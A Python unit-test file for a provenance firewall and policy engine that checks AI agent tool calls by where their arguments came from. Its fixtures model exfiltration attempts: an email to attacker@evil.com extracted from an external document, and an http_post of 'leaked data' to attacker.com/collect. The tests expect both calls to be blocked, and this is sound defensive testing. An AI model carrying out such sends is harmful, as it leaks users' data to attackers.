"""
test_provenance_firewall.py — Unit tests for the provenance firewall core.

Tests cover three areas:
  1. Provenance chain resolution (resolve_chain, provenance_summary)
  2. Mixed provenance detection (mixed_provenance)
  3. Policy rule evaluation (ProvenanceFirewall, PolicyEngine)
"""

import pytest
from pathlib import Path

import sys
# Add src/ to path so agent_hypervisor package is importable without install
sys.path.insert(0, str(Path(__file__).parent.parent / "src"))

from agent_hypervisor.models import (
    ProvenanceClass,
    Role,
    ToolCall,
    ValueRef,
    Verdict,
)
from agent_hypervisor.provenance import (
    resolve_chain,
    mixed_provenance,
    least_trusted,
    provenance_summary,
)
from agent_hypervisor.firewall import ProvenanceFirewall
from agent_hypervisor.policy_engine import PolicyEngine, PolicyRule, RuleVerdict


# ---------------------------------------------------------------------------
# Fixtures: reusable ValueRef instances
# ---------------------------------------------------------------------------

def make_external_doc(doc_id: str = "doc:report") -> ValueRef:
    return ValueRef(
        id=doc_id,
        value="Report content with attacker@evil.com in it",
        provenance=ProvenanceClass.external_document,
        roles=[Role.data_source],
        source_label="report.txt",
    )


def make_declared_contacts(label: str = "approved_contacts") -> ValueRef:
    return ValueRef(
        id=f"declared:{label}",
        value="alice@company.com\nbob@company.com\nreports@company.com",
        provenance=ProvenanceClass.user_declared,
        roles=[Role.recipient_source],
        source_label=label,
    )


def make_derived_from(parent: ValueRef, value: str, derived_id: str = "") -> ValueRef:
    return ValueRef(
        id=derived_id or f"derived:{parent.id}",
        value=value,
        provenance=ProvenanceClass.derived,
        roles=[Role.extracted_recipients],
        parents=[parent.id],
        source_label=f"extracted from {parent.source_label}",
    )


def make_system_value(arg_id: str, value: str) -> ValueRef:
    return ValueRef(
        id=arg_id,
        value=value,
        provenance=ProvenanceClass.system,
        source_label="system",
    )


# ---------------------------------------------------------------------------
# 1. Provenance chain resolution
# ---------------------------------------------------------------------------

class TestResolveChain:

    def test_single_node_no_parents(self):
        ref = make_external_doc()
        registry = {ref.id: ref}
        chain = resolve_chain(ref, registry)
        assert len(chain) == 1
        assert chain[0].id == ref.id

    def test_two_level_chain(self):
        doc = make_external_doc()
        derived = make_derived_from(doc, "attacker@evil.com")
        registry = {doc.id: doc, derived.id: derived}

        chain = resolve_chain(derived, registry)
        ids = [r.id for r in chain]
        assert derived.id in ids
        assert doc.id in ids

    def test_chain_starts_with_ref(self):
        doc = make_external_doc()
        derived = make_derived_from(doc, "x@x.com")
        registry = {doc.id: doc, derived.id: derived}
        chain = resolve_chain(derived, registry)
        assert chain[0].id == derived.id

    def test_missing_parent_is_silently_skipped(self):
        ref = ValueRef(
            id="orphan",
            value="x",
            provenance=ProvenanceClass.derived,
            parents=["nonexistent-parent"],
        )
        registry = {ref.id: ref}
        chain = resolve_chain(ref, registry)
        assert len(chain) == 1
        assert chain[0].id == "orphan"

    def test_cycle_does_not_loop_forever(self):
        a = ValueRef(id="a", value="a", provenance=ProvenanceClass.derived, parents=["b"])
        b = ValueRef(id="b", value="b", provenance=ProvenanceClass.derived, parents=["a"])
        registry = {"a": a, "b": b}
        # Should terminate without infinite recursion
        chain = resolve_chain(a, registry)
        assert {r.id for r in chain} == {"a", "b"}

    def test_three_level_chain(self):
        doc = make_external_doc("doc:root")
        mid = ValueRef(
            id="mid",
            value="mid-val",
            provenance=ProvenanceClass.derived,
            parents=[doc.id],
        )
        leaf = ValueRef(
            id="leaf",
            value="leaf-val",
            provenance=ProvenanceClass.derived,
            parents=[mid.id],
        )
        registry = {doc.id: doc, mid.id: mid, leaf.id: leaf}
        chain = resolve_chain(leaf, registry)
        ids = {r.id for r in chain}
        assert ids == {doc.id, mid.id, leaf.id}

    def test_provenance_summary_format(self):
        doc = make_external_doc()
        derived = make_derived_from(doc, "x@x.com")
        registry = {doc.id: doc, derived.id: derived}
        summary = provenance_summary(derived, registry)
        assert "external_document" in summary
        assert "derived" in summary
        assert " <- " in summary


# ---------------------------------------------------------------------------
# 2. Mixed provenance detection
# ---------------------------------------------------------------------------

class TestMixedProvenance:

    def test_single_provenance_not_mixed(self):
        doc = make_external_doc()
        registry = {doc.id: doc}
        assert mixed_provenance(doc, registry) is False

    def test_two_different_provenances_is_mixed(self):
        contacts = make_declared_contacts()
        doc = make_external_doc()
        # A value derived from both
        mixed = ValueRef(
            id="mixed:1",
            value="combined",
            provenance=ProvenanceClass.derived,
            parents=[contacts.id, doc.id],
        )
        registry = {contacts.id: contacts, doc.id: doc, mixed.id: mixed}
        assert mixed_provenance(mixed, registry) is True

    def test_derived_from_single_external_is_not_mixed(self):
        doc = make_external_doc()
        derived = make_derived_from(doc, "x@x.com")
        registry = {doc.id: doc, derived.id: derived}
        # chain has derived + external_document → two classes → mixed
        # (derived and external_document are different)
        assert mixed_provenance(derived, registry) is True

    def test_derived_from_single_user_declared(self):
        contacts = make_declared_contacts()
        derived = ValueRef(
            id="derived:contacts",
            value="alice@company.com",
            provenance=ProvenanceClass.derived,
            parents=[contacts.id],
            roles=[Role.extracted_recipients],
        )
        registry = {contacts.id: contacts, derived.id: derived}
        # chain: derived + user_declared → two classes → mixed
        assert mixed_provenance(derived, registry) is True

    def test_system_only_not_mixed(self):
        ref = make_system_value("sys:1", "Q3 Report")
        registry = {ref.id: ref}
        assert mixed_provenance(ref, registry) is False


# ---------------------------------------------------------------------------
# 3. Least trusted
# ---------------------------------------------------------------------------

class TestLeastTrusted:

    def test_external_beats_everything(self):
        result = least_trusted([
            ProvenanceClass.user_declared,
            ProvenanceClass.system,
            ProvenanceClass.external_document,
        ])
        assert result == ProvenanceClass.external_document

    def test_derived_beats_user_declared(self):
        result = least_trusted([
            ProvenanceClass.user_declared,
            ProvenanceClass.derived,
        ])
        assert result == ProvenanceClass.derived

    def test_empty_returns_external(self):
        result = least_trusted([])
        assert result == ProvenanceClass.external_document

    def test_single_value(self):
        result = least_trusted([ProvenanceClass.system])
        assert result == ProvenanceClass.system


# ---------------------------------------------------------------------------
# 4. ProvenanceFirewall — policy rule evaluation
# ---------------------------------------------------------------------------

class TestProvenanceFirewall:

    def _make_send_email_call(self, to_ref: ValueRef, call_id: str = "c1") -> ToolCall:
        return ToolCall(
            tool="send_email",
            args={
                "to": to_ref,
                "subject": make_system_value("subj:1", "Report"),
                "body": make_system_value("body:1", "See attached."),
            },
            call_id=call_id,
        )

    def test_unprotected_always_allows(self):
        fw = ProvenanceFirewall(task={}, protection_enabled=False)
        doc = make_external_doc()
        derived = make_derived_from(doc, "bad@evil.com")
        registry = {doc.id: doc, derived.id: derived}
        call = self._make_send_email_call(derived)
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.allow

    def test_tool_not_granted_is_denied(self):
        task = {"action_grants": [{"tool": "read_file", "allowed": True}]}
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        doc = make_external_doc()
        derived = make_derived_from(doc, "bad@evil.com")
        registry = {doc.id: doc, derived.id: derived}
        call = self._make_send_email_call(derived)
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.deny
        assert "RULE-04" in decision.violated_rules

    def test_rule01_blocks_external_recipient(self):
        task = {
            "action_grants": [
                {"tool": "read_file", "allowed": True},
                {"tool": "send_email", "allowed": True, "require_confirmation": False},
            ],
            "declared_inputs": [],
        }
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        doc = make_external_doc()
        derived = make_derived_from(doc, "attacker@evil.com")
        registry = {doc.id: doc, derived.id: derived}
        call = self._make_send_email_call(derived)
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.deny
        assert "RULE-01" in decision.violated_rules or "RULE-02" in decision.violated_rules

    def test_rule02_allows_declared_recipient_source(self):
        contacts = make_declared_contacts()
        derived = ValueRef(
            id="derived:contacts",
            value="alice@company.com",
            provenance=ProvenanceClass.derived,
            parents=[contacts.id],
            roles=[Role.extracted_recipients],
            source_label="extracted from approved_contacts",
        )
        task = {
            "declared_inputs": [
                {"id": "approved_contacts", "roles": ["recipient_source"],
                 "provenance_class": "user_declared"},
            ],
            "action_grants": [
                {"tool": "read_file", "allowed": True},
                {"tool": "send_email", "allowed": True, "require_confirmation": False},
            ],
        }
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        registry = {contacts.id: contacts, derived.id: derived}
        call = self._make_send_email_call(derived)
        decision = fw.check(call, registry)
        # Should allow (or ask if require_confirmation=True)
        assert decision.verdict in (Verdict.allow, Verdict.ask)

    def test_rule05_returns_ask_when_confirmation_required(self):
        contacts = make_declared_contacts()
        derived = ValueRef(
            id="derived:contacts",
            value="alice@company.com",
            provenance=ProvenanceClass.derived,
            parents=[contacts.id],
            roles=[Role.extracted_recipients],
            source_label="extracted from approved_contacts",
        )
        task = {
            "declared_inputs": [
                {"id": "approved_contacts", "roles": ["recipient_source"],
                 "provenance_class": "user_declared"},
            ],
            "action_grants": [
                {"tool": "read_file", "allowed": True},
                {"tool": "send_email", "allowed": True, "require_confirmation": True},
            ],
        }
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        registry = {contacts.id: contacts, derived.id: derived}
        call = self._make_send_email_call(derived)
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.ask

    def test_read_file_allowed_when_granted(self):
        task = {
            "action_grants": [{"tool": "read_file", "allowed": True}],
            "declared_inputs": [],
        }
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        path_ref = make_system_value("path:1", "/data/report.txt")
        call = ToolCall(tool="read_file", args={"path": path_ref}, call_id="c2")
        registry = {path_ref.id: path_ref}
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.allow

    def test_http_post_with_external_body_denied(self):
        doc = make_external_doc()
        derived_body = make_derived_from(doc, "leaked data")
        url_ref = make_system_value("url:1", "https://attacker.com/collect")
        task = {
            "action_grants": [
                {"tool": "http_post", "allowed": True, "require_confirmation": False},
            ],
            "declared_inputs": [],
        }
        fw = ProvenanceFirewall(task=task, protection_enabled=True)
        registry = {doc.id: doc, derived_body.id: derived_body, url_ref.id: url_ref}
        call = ToolCall(
            tool="http_post",
            args={"url": url_ref, "body": derived_body},
            call_id="c3",
        )
        decision = fw.check(call, registry)
        assert decision.verdict == Verdict.deny
        assert "RULE-01" in decision.violated_rules


# ---------------------------------------------------------------------------
# 5. PolicyEngine — declarative rule evaluation
# ---------------------------------------------------------------------------

class TestPolicyEngine:

    def _make_engine(self, rules: list[dict]) -> PolicyEngine:
        return PolicyEngine.from_dict({"rules": rules})

    def test_no_rules_defaults_to_deny(self):
        engine = self._make_engine([])
        call = ToolCall(tool="send_email", args={}, call_id="c1")
        result = engine.evaluate(call, {})
        assert result.verdict == RuleVerdict.deny
        assert result.matched_rule == "default_deny"

    def test_allow_rule_matches_tool(self):
        engine = self._make_engine([
            {"id": "r1", "tool": "read_file", "verdict": "allow"},
        ])
        path = make_system_value("path:1", "/data/x.txt")
        call = ToolCall(tool="read_file", args={"path": path}, call_id="c1")
        registry = {path.id: path}
        result = engine.evaluate(call, registry)
        assert result.verdict == RuleVerdict.allow
        assert result.matched_rule == "r1"

    def test_deny_beats_allow(self):
        engine = self._make_engine([
            {"id": "r-allow", "tool": "send_email", "verdict": "allow"},
            {"id": "r-deny",  "tool": "send_email", "verdict": "deny"},
        ])
        call = ToolCall(tool="send_email", args={}, call_id="c1")
        result = engine.evaluate(call, {})
        assert result.verdict == RuleVerdict.deny

    def test_deny_beats_ask(self):
        engine = self._make_engine([
            {"id": "r-ask",  "tool": "send_email", "verdict": "ask"},
            {"id": "r-deny", "tool": "send_email", "verdict": "deny"},
        ])
        call = ToolCall(tool="send_email", args={}, call_id="c1")
        result = engine.evaluate(call, {})
        assert result.verdict == RuleVerdict.deny

    def test_provenance_condition_matches(self):
        doc = make_external_doc()
        derived = make_derived_from(doc, "bad@evil.com")
        registry = {doc.id: doc, derived.id: derived}

        engine = self._make_engine([
            {
                "id": "deny-external",
                "tool": "send_email",
                "argument": "to",
                "provenance": "external_document",
                "verdict": "deny",
            },
        ])
        call = ToolCall(
            tool="send_email",
            args={"to": derived, "subject": make_system_value("s", "R")},
            call_id="c1",
        )
        result = engine.evaluate(call, registry)
        assert result.verdict == RuleVerdict.deny
        assert result.matched_rule == "deny-external"

    def test_provenance_condition_no_match_returns_default_deny(self):
        contacts = make_declared_contacts()
        derived = ValueRef(
            id="d:c",
            value="alice@company.com",
            provenance=ProvenanceClass.derived,
            parents=[contacts.id],
        )
        registry = {contacts.id: contacts, derived.id: derived}

        engine = self._make_engine([
            {
                "id": "deny-external",
                "tool": "send_email",
                "argument": "to",
                "provenance": "external_document",   # external_document NOT in chain
                "verdict": "deny",
            },
        ])
        call = ToolCall(
            tool="send_email",
            args={"to": derived},
            call_id="c1",
        )
        result = engine.evaluate(call, registry)
        # The deny rule does NOT match (no external_document in chain)
        # → fall through to default deny
        assert result.verdict == RuleVerdict.deny
        assert result.matched_rule == "default_deny"

    def test_wildcard_tool_matches_any(self):
        engine = self._make_engine([
            {"id": "deny-all", "tool": "*", "verdict": "deny"},
        ])
        for tool in ("send_email", "read_file", "http_post", "write_file"):
            call = ToolCall(tool=tool, args={}, call_id="c")
            result = engine.evaluate(call, {})
            assert result.verdict == RuleVerdict.deny

    def test_all_matches_recorded(self):
        engine = self._make_engine([
            {"id": "r1", "tool": "send_email", "verdict": "allow"},
            {"id": "r2", "tool": "send_email", "verdict": "ask"},
            {"id": "r3", "tool": "send_email", "verdict": "deny"},
        ])
        call = ToolCall(tool="send_email", args={}, call_id="c1")
        result = engine.evaluate(call, {})
        assert set(result.all_matches) == {"r1", "r2", "r3"}
        assert result.verdict == RuleVerdict.deny

    def test_from_yaml_loads_default_policy(self):
        policy_path = Path(__file__).parent.parent / "policies" / "default_policy.yaml"
        if not policy_path.exists():
            pytest.skip("default_policy.yaml not found")
        engine = PolicyEngine.from_yaml(policy_path)
        # read_file should be allowed
        path = make_system_value("p", "/x")
        call = ToolCall(tool="read_file", args={"path": path}, call_id="c")
        result = engine.evaluate(call, {path.id: path})
        assert result.verdict == RuleVerdict.allow
